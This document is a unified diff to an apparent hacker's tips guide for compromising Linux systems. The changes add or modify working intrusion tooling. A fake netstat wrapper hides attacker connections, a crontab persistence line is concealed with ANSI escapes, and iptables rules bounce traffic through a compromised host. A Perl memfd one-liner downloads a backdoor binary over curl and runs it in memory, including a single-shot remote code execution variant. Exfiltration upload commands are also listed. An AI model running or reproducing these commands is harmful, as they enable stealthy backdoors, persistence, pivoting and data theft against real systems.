@@ -257,8 +257,8 @@ eval $(echo 6e65747374617428297b20636f6d6d616e64206e6574737461742022244022207c20
 Create a fake netstat binary in /usr/local/sbin. On a default Debian (and most Linux) the PATH variables (`echo $PATH`) lists /usr/local/sbin _before_ /usr/bin. This means that our hijacking binary /usr/local/sbin/netstat will be executed instead of /usr/bin/netstat.
 
 ```shell
-echo -e "#! /bin/bash
-exec /usr/bin/netstat \"\$@\" | grep -Fv -e :22 -e 1.2.3.4" >/usr/local/sbin/netstat \
+echo '#! /bin/bash
+exec /usr/bin/netstat "$@" | grep -Fv -e :22 -e 1.2.3.4' >/usr/local/sbin/netstat \
 && chmod 755 /usr/local/sbin/netstat \
 && touch -r /usr/bin/netstat /usr/local/sbin/netstat
 ```
@@ -330,7 +330,11 @@ echo -e "id #\\033[2K\\033[1A" >>~/.bashrc
 ### The '#' after the command 'id' is a comment and is needed so that bash still
 ### executes the 'id' but ignores the two ANSI escape sequences.
 ```
-Note: We use `echo -e` to convert `\\033` to the ANSI escape character (hex 0x1b).
+
+Add a hidden crontab line:
+```sh
+(crontab -l; echo -e "0 2 * * * { id; date;} 2>/dev/null >/tmp/.thc-was-here #\\033[2K\\033[1A") | crontab
+```
 
 Adding a `\r` (carriage return) goes a long way to hide your ssh key from `cat`:
 ```shell
@@ -386,6 +390,7 @@ xssh() {
     stty "${ttyp}"
 }
 ```
+(See [Hackshell](https://github.com/hackerschoice/hackshell))
 
 <a id="ssh-master"></a>
 **2.ii Multiple shells via 1 SSH/TCP connection**
@@ -665,7 +670,7 @@ More: [https://github.com/twelvesec/port-forwarding](https://github.com/twelvese
 
 Bounce through a host/router without needing to run a userland proxy or forwarder:
 ```sh
-ipfwinit() {
+bounceinit() {
     echo 1 >/proc/sys/net/ipv4/ip_forward
     echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
     [ $# -le 0 ] && set -- "0.0.0.0/0"
@@ -679,18 +684,20 @@ ipfwinit() {
     iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
     iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
 }
-ipfw() {
+bounce() {
     iptables -t nat -A PREROUTING -p tcp --dport "${1:?}" -m mark --mark 1188 -j DNAT --to ${2:?}:${3:?}
 }
-ipfwinit                             # Allow EVERY IP to bounce
-# ipfwinit "1.2.3.4/16" "6.6.0.0/16" # Only allow these SOURCE IP's to bounce
+bounceinit                             # Allow EVERY IP to bounce
+# bounceinit "1.2.3.4/16" "6.6.0.0/16" # Only allow these SOURCE IP's to bounce
 ```
+(See [Hackshell](https://github.com/hackerschoice/hackshell) `bounce`)
+
 
 Then set forwards like so:
 ```sh
-ipfw 31337 144.76.220.20 22 # Bounce 31337 to segfault's ssh port.
-ipfw 31338 127.0.0.1 8080   # Bounce 31338 to the server's 8080 (localhost)
-ipfw 53 213.171.212.212 443 # Bounce 53 to gsrn-relay on port 443
+bounce 31337 144.76.220.20 22 # Bounce 31337 to segfault's ssh port.
+bounce 31338 127.0.0.1 8080   # Bounce 31338 to the server's 8080 (localhost)
+bounce 53 213.171.212.212 443 # Bounce 53 to gsrn-relay on port 443
 ```
 
 We use this trick to reach the gsocket-relay-network (or TOR) from deep inside firewalled networks.
@@ -863,7 +870,27 @@ nmap nmap -n -Pn -sCV -F --open --min-rate 10000 scanme.nmap.org
 nmap -A -F -Pn --min-rate 10000 --script vulners.nse --script-timeout=5s scanme.nmap.org
 ```
 
-Using bash:
+Scan for open TCP ports:
+```sh
+_scan_single() {
+    local opt=("${2}")
+    [ -f "$2" ] && opt=("-iL" "$2")
+    nmap -Pn -p"${1}" --open -T4 -n -oG - "${opt[@]}" 2>/dev/null | grep -F Ports
+}
+scan() {
+    local port="${1:?}"
+    shift 1
+    for ip in "$@"; do
+        _scan_single "$port" "$ip"
+    done
+}
+# scan <ports> <IP or file> ...
+# scan 22,80,443 192.168.0.1
+# scan - 192.168.0.1-254" 10.0.0.1-254
+```
+(See [Hackshell](https://github.com/hackerschoice/hackshell) `scan`)
+
+Simple bash port-scanner:
 ```shell
 timeout 5 bash -c "</dev/tcp/1.2.3.4/31337" && echo OPEN || echo CLOSED
 ```
@@ -2209,14 +2236,14 @@ Verify that binary can not be unpacked:
 upx -d "${BIN}"  # Should fail with 'not packed by UPX'
 ```
 
-Optionally encrypt it with [Ezuri](https://github.com/guitmz/ezuri) thereafter.
+Optionally encrypt it with [bincrypter](https://github.com/hackerschoice/bincrypter).
 
 <a id="memexec"></a>
 **8.viii. Deploying a backdoor without touching the file-system**
 
-How to start a backdoor without writing to the file-system or when all writeable locations are mounted with the evil `noexec`-flag.
+Start a backdoor without writing to the file-system or when all writeable locations are mounted with the evil `noexec`-flag.
 
-A Perl one-liner to load a binary into memory and execute it (without touching any disk or /dev/shm or /tmp).
+A Perl one-liner to load a binary into memory and execute it (without touching any disk or /dev/shm or /tmp). See [Hackshell](https://github.com/hackerschoice/hackshell/blob/main/hackshell.sh) for more.
 ```sh
 memexec() {
     local stropen strread
@@ -2242,7 +2269,7 @@ exec {"/proc/$$/fd/$f"} '"${strargv0}"'@ARGV or die "exec: $!";' -- "$@"
 
 The shortest possible variant is (example):
 ```shell
-memexec(){ perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@";}
+memexec(){ perl '-efor(319,279,385,4314,4354){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@";}
 # Example: cat /usr/bin/id | memexec -u
 ```
 (Thank you [tmp.Out](https://tmpout.sh/) for some educated discussions and [previous work](https://captain-woof.medium.com/how-to-execute-an-elf-in-memory-living-off-the-land-c7e67dbc3100) by others)
@@ -2254,13 +2281,13 @@ GS_ARGS="-ilqD -s SecretChangeMe31337" memexec <(curl -SsfL https://gsocket.io/b
 
 The backdoor can also be piped via SSH directly into the remote's memory, and executed:
 ```sh
-MX='-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV'
+MX='-efor(319,279,385,4314,4354){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV'
 curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | ssh root@foobar "exec perl '$MX' -- -ilqD -s SecretChangeMe31337"
 ```
 
 If you have a single-shot at remote executing a command (like via a PHP exploit) then this is your line:
 ```sh
-curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)|perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- -ilqD -s SecretChangeMe31337
+curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)|perl '-efor(319,279,385,4314,4354){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- -ilqD -s SecretChangeMe31337
 ```
 
 ---
@@ -2552,18 +2579,19 @@ Many other services (for free)
 Reverse DNS from multiple public databases:
 ```sh
 rdns () {
-    curl -fsSL "https://ip.thc.org/api/v1/download?ip_address=${1:?}&limit=10&apex_domain=${2}" | column -t -s,
+    curl -m10 -fsSL "https://ip.thc.org/${1:?}?limit=20&f=${2}"
 }
 # rdns <IP>
 ```
 
-Find sub domains from TLS Database:
+Find sub domains from TLS/THC-IP Database:
 ```sh
-crt() {
+sub() {
     [ $# -ne 1 ] && { echo >&2 "crt <domain-name>"; return 255; }
     curl -fsSL "https://crt.sh/?q=${1:?}&output=json" --compressed | jq -r '.[].common_name,.[].name_value' | anew | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]'
+    curl -fsSL "https://ip.thc.org/sb/${1:?}"
 }
-# crt <domain>
+# sub <domain>
 ```
 
 | OSINT Hacker Tools ||
@@ -2667,7 +2695,8 @@ Phishing
 2. https://da.gd/ - Tinier TinyUrl and allows https://www.google.com-fish-fish@da.gd/blah
 
 Tools
-1. https://github.com/guitmz/ezuri - Obfuscate Linux binaries
+1. https://github.com/hackerschoice/bincrypter - Obfuscate & pack _any_ Linux binaries
+1. https://github.com/guitmz/ezuri - Obfuscate Linux binaries (ELF only)
 1. https://tmate.io/ - Share a screen with others
 
 Callback / Canary / Command & Control
@@ -2682,7 +2711,8 @@ Tunneling
 
 Exfil<a id="cloudexfil"></a>
 1. [Blitz](https://github.com/hackerschoice/gsocket#blitz) - `blitz -l` / `blitz foo.txt`
-2. [RedDrop](https://github.com/cyberbutler/RedDrop) - run your own Exfil Server
+2. [Segfault.net](https://thc.org/segfault) - type `exfil`
+3. [RedDrop](https://github.com/cyberbutler/RedDrop) - run your own Exfil Server
 1. [Mega](https://mega.io/cmd)
 2. [oshiAt](https://oshi.at/) - also on TOR. `curl -T foo.txt https://oshi.at`
 3. [0x0.at](https://0x0.st) - `curl -F'file=@foo.txt'  https://0x0.st/`
